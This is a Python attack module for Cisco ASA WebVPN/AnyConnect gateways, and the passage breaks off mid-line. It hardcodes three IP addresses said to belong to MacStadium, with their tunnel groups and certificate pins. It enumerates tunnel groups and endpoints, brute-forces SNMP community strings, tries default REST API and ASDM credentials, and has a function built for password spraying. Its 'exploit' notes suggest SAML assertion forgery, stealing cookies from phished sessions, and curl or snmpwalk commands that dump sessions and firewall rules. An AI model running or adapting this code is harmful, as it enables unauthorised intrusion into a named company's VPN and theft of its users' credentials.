#!/usr/bin/env python3
"""
Cisco ASA WebVPN / AnyConnect Enumeration Module
Synthesized from: RE of MacStadium ASA instances at 207.254.16.2 / 207.254.72.76 / 207.254.35.12
Books: Cisco ASA All-in-One NGFW (3rd Ed), Cisco ASA All-in-One Firewall (1st Ed)

Auth state machine (confirmed via live RE):
  GET  /+CSCOE+/logon.html          -> form page; extract csrf_token + tg cookie
  POST /+webvpn+/index.html          -> auth submit; body: username, password, tgroup, csrf_token
  GET  /+CSCOE+/portal.html          -> post-auth portal (authenticated session gate)
  GET  /+CSCOE+/logout.html          -> session termination
  POST /+CSCOE+/saml/sp/login        -> SAML SP initiation; ?tgname=<group>
  GET  /+CSCOE+/saml/sp/acs          -> SAML ACS endpoint (IdP POST here after auth)

tg cookie format (confirmed):
  Client sets:  "1" + base64url(group_name)   -- e.g. "1ZW1wbG95ZWVz" for "employees"
  Server sets:  "0" + base64url(group_name)   -- e.g. "0ZW1wbG95ZWVz"
  Both prefix patterns must be tried when the group is known

Tunnel group types (from Cisco ASA config language):
  tunnel-group <name> type remote-access  -- WebVPN / AnyConnect
  tunnel-group <name> type ipsec-ra       -- legacy IPsec remote access
  webvpn config with: authentication {aaa | certificate | both | saml}

Known MacStadium groups (RE + SAML SP discovery):
  employees          (atl-vpn .16.2) -- AD/Azure AD auth
  MacStadium-SSO-VPN (las-vpn .76)  -- SAML → Azure AD tenant 6ba327df-...
  MacStadium-VPN     (both ASAs)    -- RADIUS/local auth fallback
"""

import base64
import re
import socket
import struct
import urllib.request
import urllib.error
import urllib.parse
import json
import ssl
import time
from pathlib import Path

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# ── Known ASA instances (MacStadium) ─────────────────────────────────────────
MACSTADIUM_ASAS = [
    {
        'host': '207.254.35.12',
        'name': 'atl-vpn-1',
        'cert_pin': 'Ce6mmGJg5Yl52TwnfMlo+WEA63EtqR3zfwQvpKVufo8=',
        'groups': ['MacStadium-VPN', 'employees'],
    },
    {
        'host': '207.254.16.2',
        'name': 'atl-vpn-2',
        'cert_pin': 'kwoLhfR3WhAMiGNYwZKwHi5y04fvMOO7MqtNfNIqHzo=',
        'groups': ['MacStadium-VPN', 'employees'],
    },
    {
        'host': '207.254.72.76',
        'name': 'las-vpn',
        'cert_pin': None,
        'groups': ['MacStadium-SSO-VPN', 'MacStadium-VPN'],
    },
]

# Full WebVPN endpoint surface
ASA_WEBVPN_ENDPOINTS = [
    '/+CSCOE+/logon.html',
    '/+CSCOE+/portal.html',
    '/+CSCOE+/logout.html',
    '/+CSCOE+/saml/sp/login',
    '/+CSCOE+/saml/sp/acs',
    '/+CSCOE+/saml/sp/metadata',
    '/+CSCOE+/certauth.html',
    '/+CSCOE+/sdesktop/',
    '/+CSCOE+/webvpn.html',
    '/+CSCOE+/files/',
    '/+CSCOE+/admin/',
    '/+webvpn+/index.html',
    '/+webvpn+/logout.html',
    '/+webvpn+/webvpn_logout.html',
    '/CACHE/stc/1/index.html',
    '/admin/main.html',
    '/+ASDM+/main/',
]

# ASDM / REST API endpoints
ASA_MGMT_ENDPOINTS = [
    '/admin/public/',
    '/admin/main.html',
    '/api/',
    '/api/v1/',
    '/api/v1/device/',
    '/api/v1/firewall/',
    '/api/v1/vpn/',
]

# ASA REST API (port 55443 or 443/api/) — from Cisco DevNet
ASA_REST_API_ENDPOINTS = [
    '/api/v1/device/version',
    '/api/v1/device/serialnumber',
    '/api/v1/license/details',
    '/api/v1/monitoring/connections/statistics',
    '/api/v1/vpn/sessiondb/anyconnect',
    '/api/v1/vpn/sessiondb/webvpn',
    '/api/v1/identity/users',
    '/api/v1/objects/networkobjects',
    '/api/v1/firewall/rules/in',
    '/api/v1/firewall/rules/out',
    '/api/v1/interfaces',
    '/api/v1/routing/static',
]

# REST API default credentials (admin:cisco is the factory default)
ASA_REST_DEFAULT_CREDS = [
    ('admin', 'cisco'),
    ('admin', 'admin'),
    ('admin', ''),
    ('cisco', 'cisco'),
    ('pix', 'cisco'),
]

# ASDM default credentials — from 1e ch18: "default password is cisco"
ASDM_DEFAULT_CREDS = [
    ('', 'cisco'),           # factory default: no username, cisco password
    ('admin', 'admin'),
    ('admin', 'cisco'),
    ('pix', 'cisco'),
    ('enable', 'cisco'),
]

# ASDM access paths — /admin/public/index.html is the standard entry
ASDM_PATHS = [
    '/admin/public/index.html',
    '/admin/public/',
    '/admin/main.html',
    '/admin/',
    '/admin/index.html',
]

# Group-url alias candidates — tunnel groups can bind a URL alias via
# 'tunnel-group <name> webvpn-attributes; group-url https://host/<alias> enable'
WEBVPN_GROUP_URL_CANDIDATES = [
    '/employees', '/vpn', '/remote', '/staff', '/contractor', '/guest',
    '/sslvpnclient', '/corp', '/corporate', '/production', '/users',
    '/mgmt', '/management', '/it', '/engineering', '/sso', '/SSO',
    '/saml', '/SAML', '/employees-sso', '/portal', '/webvpn',
    '/MacStadium', '/MacStadium-VPN', '/MacStadium-SSO-VPN',
    '/SecureMeClientless', '/anyconnect', '/asa',
]

# WebVPN portal file/application paths — from 3e ch22 (application access)
WEBVPN_APP_PATHS = [
    '/+CSCOE+/win.html',               # port-forwarding applet launch
    '/+CSCOE+/app/',                   # application access
    '/+CSCOE+/files/browse.html',      # CIFS file browser
    '/+CSCOE+/files/dp.asp',           # file download proxy
    '/+CSCOE+/rdp/',                   # RDP plug-in
    '/+CSCOE+/ssh/',                   # SSH/Telnet plug-in
    '/+CSCOU+/',                       # unauthenticated web content store (logos/scripts)
    '/+CSCOU+/custom.js',              # custom JS (unauthenticated)
    '/+CSCOE+/sdesktop/',              # Cisco Secure Desktop (CSD/HostScan)
    '/+CSCOE+/sdesktop/data/policy.xml',  # CSD policy — potential info disclosure
    '/+CSCOE+/connstatus.html',        # connection status page
    '/+CSCOE+/he.html',               # home edge
    '/CACHE/stc/1/index.html',         # cached static content
]

# SNMP default community strings — v1/v2c; from 3e ch05 (SNMP traps config)
SNMP_DEFAULT_COMMUNITIES = ['public', 'private', 'cisco', 'RO', 'RW', 'community', 'snmp']

# Key SNMP OIDs for ASA enumeration
SNMP_OIDS = {
    'sysDescr':     '1.3.6.1.2.1.1.1.0',   # system description (version/hardware)
    'sysObjectID':  '1.3.6.1.2.1.1.2.0',   # device type OID
    'sysName':      '1.3.6.1.2.1.1.5.0',   # hostname
    'sysContact':   '1.3.6.1.2.1.1.4.0',   # contact
    'sysLocation':  '1.3.6.1.2.1.1.6.0',   # location
    'ciscoModel':   '1.3.6.1.4.1.9.9.25.1.1.1.2.7',   # Cisco software version attr
    'vpnSessions':  '1.3.6.1.4.1.9.9.392.1.3.35.0',   # active VPN session count
}

# LOCAL auth fallback candidates — tested when primary AAA server is unreachable;
# ASA falls back to local user database ('aaa authentication ... LOCAL')
AAA_LOCAL_FALLBACK_CREDS = [
    ('cisco', 'cisco'),
    ('admin', 'admin'),
    ('admin', 'cisco'),
    ('vpn', 'vpn'),
    ('vpnuser', 'vpnuser'),
    ('test', 'test'),
    ('user', 'user'),
    ('guest', 'password'),
]


def _ssl_ctx(verify=False):
    ctx = ssl.create_default_context()
    if not verify:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _get(url, headers=None, cookies=None, timeout=8, verify=False):
    """HTTPS GET with cookie support."""
    if _HAS_REQUESTS:
        s = _requests.Session()
        s.verify = verify
        if cookies:
            s.cookies.update(cookies)
        try:
            r = s.get(url, headers=headers or {}, timeout=timeout)
            return r.status_code, r.text, dict(r.headers), dict(r.cookies)
        except Exception as e:
            return None, str(e), {}, {}

    # urllib fallback
    req = urllib.request.Request(url, headers=headers or {})
    if cookies:
        cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items())
        req.add_header('Cookie', cookie_str)
    try:
        ctx = _ssl_ctx(verify)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read().decode('utf-8', errors='replace')
            hdrs = dict(resp.headers)
            # parse Set-Cookie crudely
            ck = {}
            for sc in resp.headers.get_all('Set-Cookie') or []:
                parts = sc.split(';')[0].strip().split('=', 1)
                if len(parts) == 2:
                    ck[parts[0]] = parts[1]
            return resp.status, body, hdrs, ck
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
        return e.code, body, dict(e.headers), {}
    except Exception as e:
        return None, str(e), {}, {}


def _post(url, data, headers=None, cookies=None, timeout=8, verify=False):
    """HTTPS POST."""
    if _HAS_REQUESTS:
        s = _requests.Session()
        s.verify = verify
        if cookies:
            s.cookies.update(cookies)
        try:
            r = s.post(url, data=data, headers=headers or {}, timeout=timeout)
            return r.status_code, r.text, dict(r.headers), dict(r.cookies)
        except Exception as e:
            return None, str(e), {}, {}

    body_bytes = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body_bytes, headers=headers or {}, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    if cookies:
        cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items())
        req.add_header('Cookie', cookie_str)
    try:
        ctx = _ssl_ctx(verify)
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            body = resp.read().decode('utf-8', errors='replace')
            return resp.status, body, dict(resp.headers), {}
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace')
        return e.code, body, dict(e.headers), {}
    except Exception as e:
        return None, str(e), {}, {}


# ── SNMP BER helpers (stdlib only) ───────────────────────────────────────────

def _ber_len(n):
    """Encode BER length field."""
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(b)]) + b


def _ber_int(n):
    """Encode BER INTEGER."""
    if n == 0:
        return b'\x02\x01\x00'
    b = n.to_bytes(max(1, (n.bit_length() + 8) // 8), 'big')
    return b'\x02' + _ber_len(len(b)) + b


def _ber_str(s):
    """Encode BER OCTET STRING."""
    b = s if isinstance(s, bytes) else s.encode()
    return b'\x04' + _ber_len(len(b)) + b


def _ber_oid(dotted):
    """Encode BER OBJECT IDENTIFIER from dotted-decimal string."""
    parts = [int(x) for x in dotted.split('.')]
    encoded = [40 * parts[0] + parts[1]]
    for v in parts[2:]:
        if v == 0:
            encoded.append(0)
        else:
            octets = []
            while v:
                octets.insert(0, v & 0x7f)
                v >>= 7
            for i in range(len(octets) - 1):
                octets[i] |= 0x80
            encoded.extend(octets)
    raw = bytes(encoded)
    return b'\x06' + _ber_len(len(raw)) + raw


def _ber_seq(tag, *parts):
    """Encode BER SEQUENCE/PDU with given tag byte."""
    body = b''.join(parts)
    return bytes([tag]) + _ber_len(len(body)) + body


def _snmp_get_packet(community, oid, version=0, req_id=1):
    """Build SNMP v1 (version=0) or v2c (version=1) GetRequest packet."""
    null = b'\x05\x00'
    varbind = _ber_seq(0x30, _ber_oid(oid), null)
    varbind_list = _ber_seq(0x30, varbind)
    pdu = _ber_seq(
        0xa0,               # GetRequest-PDU tag
        _ber_int(req_id),   # request-id
        _ber_int(0),        # error-status
        _ber_int(0),        # error-index
        varbind_list,
    )
    return _ber_seq(0x30, _ber_int(version), _ber_str(community), pdu)


def _parse_snmp_octet_strings(data):
    """Extract all OCTET STRING values from raw SNMP response bytes."""
    results = []
    i = 0
    while i < len(data) - 2:
        if data[i] == 0x04:  # OctetString tag
            raw_len = data[i + 1]
            if raw_len < 0x80:
                val_len = raw_len
                val_start = i + 2
            elif raw_len == 0x81 and i + 2 < len(data):
                val_len = data[i + 2]
                val_start = i + 3
            else:
                i += 1
                continue
            if val_start + val_len <= len(data):
                raw = data[val_start:val_start + val_len]
                try:
                    decoded = raw.decode('utf-8', errors='replace')
                    if len(decoded) > 2:
                        results.append(decoded)
                except Exception:
                    pass
                i = val_start + val_len
            else:
                i += 1
        else:
            i += 1
    return results


def _snmp_query(host, community, oid, version=0, port=161, timeout=3):
    """Send one SNMP GET and return the first non-community OctetString value."""
    pkt = _snmp_get_packet(community, oid, version=version)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(pkt, (host, port))
        data, _ = sock.recvfrom(4096)
        strings = _parse_snmp_octet_strings(data)
        # Skip community string echo; return longest remaining value
        filtered = [s for s in strings if community not in s and len(s) > 4]
        return max(filtered, key=len) if filtered else None
    except Exception:
        return None
    finally:
        try:
            sock.close()
        except Exception:
            pass


def tg_cookie(group_name, prefix='1'):
    """Build ASA tunnel-group cookie value.

    Client format: '1' + base64(group_name)
    Server format: '0' + base64(group_name)
    Both must be tried.
    """
    encoded = base64.b64encode(group_name.encode()).decode()
    return prefix + encoded


def parse_csrf_token(html):
    """Extract CSRF token from ASA logon page."""
    m = re.search(r'input[^>]+name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'csrf_token["\']?\s*[=:]\s*["\']([a-f0-9]{32,64})["\']', html, re.I)
    if m:
        return m.group(1)
    return None


def parse_tunnel_groups(html):
    """Extract tunnel group names from logon page HTML."""
    groups = set()
    # <option value="group_name"> pattern in group selector
    for m in re.finditer(r'<option[^>]+value=["\']([^"\']+)["\']', html, re.I):
        val = m.group(1)
        if val and not val.startswith('/') and len(val) < 64:
            groups.add(val)
    # Also look for tg= cookie hints in script blocks
    for m in re.finditer(r'tg(?:_name|Name)?\s*[=:]\s*["\']([^"\']+)["\']', html):
        groups.add(m.group(1))
    return list(groups)


def parse_saml_idp(html):
    """Extract SAML IdP URL and tenant info from SAML initiation page."""
    idp = {}
    # Look for SAMLRequest redirect URL
    m = re.search(r'(https://[^\s"\']+SAMLRequest[^\s"\']*)', html)
    if m:
        idp['redirect_url'] = m.group(1)
    # Azure AD tenant
    m = re.search(r'/([\w\-]{36})/saml2', html)
    if m:
        idp['tenant_id'] = m.group(1)
    # Microsoft login.microsoftonline.com
    if 'microsoftonline.com' in html or 'azure' in html.lower():
        idp['provider'] = 'Azure AD'
    elif 'okta.com' in html:
        idp['provider'] = 'Okta'
    elif 'onelogin.com' in html:
        idp['provider'] = 'OneLogin'
    # Form action on SAML page
    m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
    if m:
        idp['form_action'] = m.group(1)
    return idp


class ASAEnumerator:
    """Enumerate Cisco ASA WebVPN / AnyConnect attack surface."""

    def __init__(self, host, port=443, name=None):
        self.host = host
        self.port = port
        self.name = name or host
        self.base_url = f'https://{host}:{port}' if port != 443 else f'https://{host}'
        self.findings = []
        self.groups = []
        self.saml_groups = []
        self.auth_types = {}  # group -> auth_type
        self.csrf_token = None
        self.session_cookies = {}
        self.version_info = {}

    def enumerate_all(self):
        """Run full enumeration chain."""
        # ── Phase 1: Passive/safe probes ──
        self.probe_version()
        self.probe_snmp()
        self.probe_endpoint_surface()

        # ── Phase 2: WebVPN surface ──
        self.probe_logon_page()
        self.probe_default_tunnel_groups()
        self.probe_saml_groups()
        self.probe_saml_metadata()
        self.probe_group_url_enum()
        self.probe_webvpn_portal_paths()
        self.probe_port_forward_surface()

        # ── Phase 3: Management interface ──
        self.probe_mgmt_interface()
        self.probe_rest_api()
        self.probe_asdm_default_creds()
        self.probe_asdm_default_creds_extended()

        # ── Phase 4: Auth surface ──
        self.probe_certauth()
        self.probe_cert_revocation_check()
        self.probe_aaa_local_fallback()

        # ── Phase 5: VPN policy surface ──
        self.probe_sysopt_vpn_bypass()
        self.probe_tunnel_group_lock()

        # ── Phase 6: Clientless file access + DAP ──
        self.probe_clientless_file_access()
        self.probe_dap_bypass()

        # ── Phase 7: Application inspection pinholes + packet-tracer + SNMP ──
        self.probe_application_inspection_pinholes()
        self.probe_packet_tracer_rest()
        self.probe_snmp_community_strings()

        return self._result()

    def _result(self):
        return {
            'host':           self.host,
            'name':           self.name,
            'version':        self.version_info,
            'groups':         self.groups,
            'saml_groups':    self.saml_groups,
            'auth_types':     self.auth_types,
            'findings':       self.findings,
        }

    # ── Version/banner ────────────────────────────────────────────────────────

    def probe_version(self):
        """Extract ASA version from HTTP headers and page content."""
        sc, body, hdrs, _ = _get(f'{self.base_url}/+CSCOE+/logon.html')
        if sc is None:
            return

        # Server header
        server = hdrs.get('Server', hdrs.get('server', ''))
        if server:
            self.version_info['server_header'] = server

        # ASA version string in HTML
        m = re.search(r'Cisco\s+Systems.*?(?:Version|ver)\s+([\d\.]+)', body, re.I)
        if m:
            self.version_info['asa_version'] = m.group(1)

        # X-Powered-By or similar
        for h in ['X-Powered-By', 'X-Frame-Options', 'Strict-Transport-Security']:
            v = hdrs.get(h, hdrs.get(h.lower(), ''))
            if v:
                self.version_info[h] = v

    # ── Endpoint surface scan ─────────────────────────────────────────────────

    def probe_endpoint_surface(self):
        """Probe all known WebVPN endpoints; record status codes."""
        reachable = []
        for ep in ASA_WEBVPN_ENDPOINTS:
            sc, body, hdrs, _ = _get(f'{self.base_url}{ep}', timeout=5)
            if sc and sc < 500:
                reachable.append({'endpoint': ep, 'status': sc, 'length': len(body)})
                # Flag unusual 200s
                if sc == 200 and ep not in ('/+CSCOE+/logon.html', '/+CSCOE+/certauth.html'):
                    self.findings.append({
                        'type': f'Unexpected 200 at {ep}',
                        'severity': 'MEDIUM',
                        'description': f'ASA {self.host} returns 200 on {ep} — may indicate misconfiguration',
                        'detail': f'Length: {len(body)} | Header sample: {list(hdrs.keys())[:4]}',
                    })

        if reachable:
            self.findings.append({
                'type': 'WebVPN Endpoint Surface',
                'severity': 'INFO',
                'description': f'{len(reachable)} WebVPN endpoints respond on {self.host}',
                'detail': '\n'.join(f"  {e['status']} {e['endpoint']}" for e in reachable),
            })

    # ── Logon page ─────────────────────────────────────────────────────────────

    def probe_logon_page(self):
        """Fetch logon page; extract CSRF token, groups, auth types."""
        sc, body, hdrs, ck = _get(f'{self.base_url}/+CSCOE+/logon.html')
        if sc != 200:
            return

        self.csrf_token = parse_csrf_token(body)
        self.session_cookies.update(ck)

        # Group extraction from group selector
        found_groups = parse_tunnel_groups(body)
        if found_groups:
            self.groups = found_groups
            self.findings.append({
                'type': 'Tunnel Groups Enumerated (Unauthenticated)',
                'severity': 'LOW',
                'description': f'{len(found_groups)} tunnel groups exposed in logon page HTML',
                'detail': f'Groups: {", ".join(found_groups)}',
                'exploit': (
                    'Use group names to target credential spray per tunnel-group. '
                    'SAML groups: initiate SAML SP flow to identify IdP tenant.'
                ),
            })

        # Detect authentication banner / AAA messages
        if 'saml' in body.lower() or 'sso' in body.lower():
            self.findings.append({
                'type': 'SAML SSO Indicator on Logon Page',
                'severity': 'INFO',
                'description': 'SAML/SSO references visible on ASA logon page',
                'detail': self.base_url,
            })

        # CSRF token presence
        if self.csrf_token:
            self.findings.append({
                'type': 'CSRF Token Extracted',
                'severity': 'INFO',
                'description': f'WebVPN CSRF token harvested from {self.base_url}/+CSCOE+/logon.html',
                'detail': f'Token: {self.csrf_token}',
                'exploit': (
                    f'POST to {self.base_url}/+webvpn+/index.html with: '
                    'username=X&password=Y&tgroup=<group>&csrf_token=<token>'
                ),
            })

    # ── Default tunnel group probing ─────────────────────────────────────────

    def probe_default_tunnel_groups(self):
        """Probe ASA default and common tunnel group names via ?tunnel-group= parameter.

        From 3e ch22: DefaultWEBVPNGroup is the catch-all group — users who do
        not select a group at logon are placed here. DefaultRAGroup is the L2TP/
        IPsec remote-access default. Both always exist on an ASA with WebVPN
        enabled; operator-configured groups may not appear in the logon page
        dropdown but still accept auth via the tunnel-group= URL parameter.

        Differential detection: a valid group name produces a logon page whose
        body contains the group name (pre-selected dropdown / banner), whose
        form action references the group, or whose server-set tg cookie encodes
        the group name. Page-length delta >10% vs the no-group baseline is a
        supporting signal. An unknown group returns the generic logon page with
        no group-specific markers.
        """
        _DEFAULT_GROUPS = [
            'DefaultWEBVPNGroup',
            'DefaultRAGroup',
            'VPN_Users',
            'VPN-Users',
            'Remote-VPN',
            'RemoteAccess',
            'AnyConnect',
            'AnyConnect-VPN',
            'SSL-VPN',
            'SSLVPN',
            'remote',
            'vpn',
            'employees',
            'staff',
            'contractors',
            'admin',
            'management',
        ]

        # Baseline: plain logon page with no group parameter — calibrates length
        _, baseline_body, _, _ = _get(f'{self.base_url}/+CSCOE+/logon.html', timeout=6)
        baseline_len = len(baseline_body) if baseline_body else 0

        confirmed = []
        for group in _DEFAULT_GROUPS:
            sc, body, hdrs, ck = _get(
                f'{self.base_url}/+CSCOE+/logon.html'
                f'?tunnel-group={urllib.parse.quote(group)}',
                timeout=6,
            )
            if sc != 200 or not body:
                continue

            signals = []

            # Group name in body (pre-selected dropdown option or banner text)
            if group.lower() in body.lower():
                signals.append('name_in_body')

            # Group name in form action
            m = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', body, re.I)
            if m and group.lower() in m.group(1).lower():
                signals.append('name_in_form_action')

            # Server-set tg cookie encodes group name: '0' + base64(group)
            if 'tg' in ck:
                try:
                    decoded = base64.b64decode(
                        ck['tg'][1:] + '=='
                    ).decode('utf-8', errors='replace')
                    if group.lower() in decoded.lower():
                        signals.append('tg_cookie_confirms')
                except Exception:
                    pass

            # Page length delta vs baseline
            if baseline_len > 0:
                delta = abs(len(body) - baseline_len) / baseline_len
                if delta > 0.10:
                    signals.append(f'length_delta_{delta:.0%}')

            if not signals:
                continue

            confirmed.append(group)
            if group not in self.groups:
                self.groups.append(group)

            self.findings.append({
                'type': f'Default Tunnel Group Confirmed: {group}',
                'severity': 'LOW',
                'description': (
                    f'Tunnel group "{group}" confirmed via differential logon '
                    f'probe on {self.host}'
                ),
                'detail': (
                    f'Signals: {", ".join(signals)}\n'
                    f'URL: {self.base_url}/+CSCOE+/logon.html'
                    f'?tunnel-group={urllib.parse.quote(group)}'
                ),
                'exploit': (
                    f'Credential spray target: POST {self.base_url}/+webvpn+/index.html '
                    f'with tgroup={group}&username=X&password=Y&csrf_token=<token>. '
                    'DefaultWEBVPNGroup accepts all clients without a pre-set group '
                    'cookie — broadest spray surface, no group-selector bypass needed.'
                ),
            })

        if confirmed:
            self.findings.append({
                'type': 'Default/Built-In Tunnel Groups Present',
                'severity': 'INFO',
                'description': (
                    f'{len(confirmed)} default/common tunnel group(s) confirmed '
                    f'on {self.host}'
                ),
                'detail': ', '.join(confirmed),
            })

        return confirmed

    # ── SAML group probing ───────────────────────────────────────────────────

    def probe_saml_groups(self):
        """Probe SAML SP initiation for each known/enumerated group."""
        probe_groups = list(set(self.groups + [
            'MacStadium-SSO-VPN', 'SSO-VPN', 'saml', 'SAML-VPN', 'employees-sso'
        ]))

        for group in probe_groups:
            sc, body, hdrs, ck = _get(
                f'{self.base_url}/+CSCOE+/saml/sp/login?tgname={urllib.parse.quote(group)}',
                timeout=6,
            )
            if sc in (200, 302):
                idp_info = parse_saml_idp(body)
                if idp_info:
                    self.saml_groups.append(group)
                    self.auth_types[group] = 'SAML'
                    loc = hdrs.get('Location', hdrs.get('location', ''))
                    self.findings.append({
                        'type': f'SAML SP Initiated: group={group}',
                        'severity': 'MEDIUM',
                        'description': (
                            f'SAML SP flow triggered for group "{group}" — IdP: '
                            f'{idp_info.get("provider", "Unknown")}'
                        ),
                        'detail': (
                            f'Tenant: {idp_info.get("tenant_id", "N/A")}\n'
                            f'Redirect: {idp_info.get("redirect_url", loc)[:100]}'
                        ),
                        'exploit': (
                            f'SAML assertion forgery: if IdP is Azure AD tenant '
                            f'{idp_info.get("tenant_id", "N/A")}, a forged SAML assertion '
                            'signed with the SP private key would bypass AD auth entirely. '
                            'Alternatively: steal SAML response cookie from phished session.'
                        ),
                    })

            # Group metadata probe via tg cookie
            for prefix in ('0', '1'):
                tg_val = tg_cookie(group, prefix=prefix)
                sc2, body2, _, _ = _get(
                    f'{self.base_url}/+CSCOE+/logon.html',
                    cookies={'tg': tg_val},
                )
                if sc2 == 200 and group.lower() in body2.lower():
                    self.auth_types.setdefault(group, 'unknown')

    # ── Certificate auth probe ────────────────────────────────────────────────

    def probe_certauth(self):
        """Probe certificate authentication endpoint."""
        sc, body, hdrs, _ = _get(f'{self.base_url}/+CSCOE+/certauth.html', timeout=5)
        if sc == 200:
            self.findings.append({
                'type': 'Certificate Auth Endpoint Active',
                'severity': 'MEDIUM',
                'description': f'ASA {self.host} has certificate auth enabled at /+CSCOE+/certauth.html',
                'detail': f'Length: {len(body)}',
                'exploit': (
                    'Certificate-based auth bypasses password spraying entirely. '
                    'If a client cert is obtained (via compromise of a developer machine or '
                    'key extraction from a VPN profile), it grants VPN access without SAML or AD.'
                ),
            })

    # ── Management interface (ASDM/REST) ──────────────────────────────────────

    def probe_mgmt_interface(self):
        """Probe ASDM and REST API endpoints."""
        for ep in ASA_MGMT_ENDPOINTS:
            sc, body, hdrs, _ = _get(f'{self.base_url}{ep}', timeout=5)
            if sc and sc < 400:
                self.findings.append({
                    'type': f'Management Interface Reachable: {ep}',
                    'severity': 'HIGH',
                    'description': (
                        f'ASA management endpoint {ep} returns {sc} — '
                        'ASDM/REST API exposure'
                    ),
                    'detail': f'Length: {len(body)} | Content-Type: {hdrs.get("Content-Type", "?")}',
                    'exploit': (
                        'ASA REST API (port 443 /api/v1/): device info, firewall rules, '
                        'VPN config — all available with admin:cisco default credentials. '
                        'ASDM: Java applet admin interface; default admin/admin.'
                    ),
                })

    # ── Credential test ───────────────────────────────────────────────────────

    def test_credential(self, username, password, group):
        """Test a single credential against a tunnel group.

        Returns: ('success'|'failure'|'locked'|'error', response_body)
        Detect auth success: redirect to /+CSCOE+/portal.html
        Detect lockout: 'too many' or 'locked' in response body
        """
        if not self.csrf_token:
            self.probe_logon_page()

        if not self.csrf_token:
            return 'error', 'No CSRF token'

        tg_val = tg_cookie(group)
        cookies = dict(self.session_cookies)
        cookies['tg'] = tg_val

        data = {
            'username':   username,
            'password':   password,
            'tgroup':     group,
            'csrf_token': self.csrf_token,
        }
        sc, body, hdrs, ck = _post(
            f'{self.base_url}/+webvpn+/index.html',
            data=data,
            cookies=cookies,
        )

        if sc is None:
            return 'error', body

        loc = hdrs.get('Location', hdrs.get('location', ''))

        if 'portal.html' in loc or 'portal.html' in body:
            return 'success', body

        body_lower = body.lower()
        if any(w in body_lower for w in ('too many', 'locked', 'account locked', 'temporarily')):
            return 'locked', body

        return 'failure', body

    # ── SNMP community string brute ───────────────────────────────────────────

    def probe_snmp(self):
        """Brute SNMP v1/v2c community strings; extract sysDescr and VPN session count.

        sysDescr (1.3.6.1.2.1.1.1.0) is the 'show version' equivalent — discloses
        ASA version, hardware model, and serial number. vpnSessions OID discloses
        active session count. Confirmed community triggers additional OID sweep.
        """
        for community in SNMP_DEFAULT_COMMUNITIES:
            for version, vname in ((0, 'v1'), (1, 'v2c')):
                val = _snmp_query(self.host, community, SNMP_OIDS['sysDescr'],
                                  version=version, timeout=3)
                if val:
                    self.version_info['snmp_community'] = community
                    self.version_info['snmp_version']   = vname
                    self.version_info['snmp_sysDescr']  = val

                    # Sweep remaining OIDs with the confirmed community
                    for oid_name, oid in list(SNMP_OIDS.items())[1:]:
                        v2 = _snmp_query(self.host, community, oid,
                                         version=version, timeout=2)
                        if v2:
                            self.version_info[f'snmp_{oid_name}'] = v2

                    session_str = self.version_info.get('snmp_vpnSessions', '')
                    self.findings.append({
                        'type': 'SNMP Community String Valid',
                        'severity': 'HIGH',
                        'description': (
                            f'SNMP community "{community}" ({vname}) accepted on '
                            f'{self.host}:161 — sysDescr discloses ASA version + hardware'
                        ),
                        'detail': (
                            f'sysDescr: {val[:200]}\n'
                            f'hostname: {self.version_info.get("snmp_sysName", "?")}\n'
                            f'location: {self.version_info.get("snmp_sysLocation", "?")}\n'
                            f'vpnSessions: {session_str or "?"}'
                        ),
                        'exploit': (
                            f'snmpwalk -v{"2c" if version else "1"} -c {community} {self.host} '
                            '1.3.6.1.4.1.9.9.392 (CISCO-REMOTE-ACCESS-MONITOR-MIB) '
                            '→ active session usernames, source IPs, assigned IPs. '
                            f'snmpget -v{"2c" if version else "1"} -c {community} {self.host} '
                            '1.3.6.1.4.1.9.9.491 (CISCO-VPN-SESSION-DB-MIB).'
                        ),
                    })
                    return  # stop on first valid community

    # ── ASA REST API (port 55443) ─────────────────────────────────────────────

    def probe_rest_api(self):
        """Probe Cisco ASA REST API at port 55443 (and 443/api/).

        REST API introduced in ASA 9.3.2 — enabled via 'rest-api image' and
        'rest-api agent'. Default admin credentials often unchanged from factory.
        Exposes: version, config, VPN sessions, firewall rules, user database.
        """
        import base64 as _b64

        for api_port in (55443, 443):
            if api_port == 443:
                base = self.base_url
            else:
                base = f'https://{self.host}:{api_port}'

            sc, body, hdrs, _ = _get(f'{base}/api/v1/device/version', timeout=5)
            if sc is None:
                continue

            if sc in (200, 401, 403):
                self.findings.append({
                    'type': f'ASA REST API Exposed (port {api_port})',
                    'severity': 'HIGH',
                    'description': (
                        f'ASA REST API at {base}/api/ returns HTTP {sc} — '
                        'API surface includes version, VPN sessions, firewall rules'
                    ),
                    'detail': (
                        f'Port: {api_port} | Auth required: {sc == 401}\n'
                        f'Content-Type: {hdrs.get("Content-Type", "?")}'
                    ),
                    'exploit': (
                        f'curl -sk -u admin:cisco {base}/api/v1/device/version → version/serial\n'
                        f'curl -sk -u admin:cisco {base}/api/v1/vpn/sessiondb/anyconnect '
                        '→ active session usernames+IPs\n'
                        f'curl -sk -u admin:cisco {base}/api/v1/firewall/rules/in → ACL dump'
                    ),
                })

                # Try default credentials
                for user, pw in ASA_REST_DEFAULT_CREDS:
                    cred_b64 = _b64.b64encode(f'{user}:{pw}'.encode()).decode()
                    auth_hdr = {'Authorization': f'Basic {cred_b64}',
                                'Accept': 'application/json'}
                    sc2, body2, _, _ = _get(
                        f'{base}/api/v1/device/version',
                        headers=auth_hdr,
                        timeout=5,
                    )
                    if sc2 == 200 and ('"version"' in body2 or 'ASA' in body2
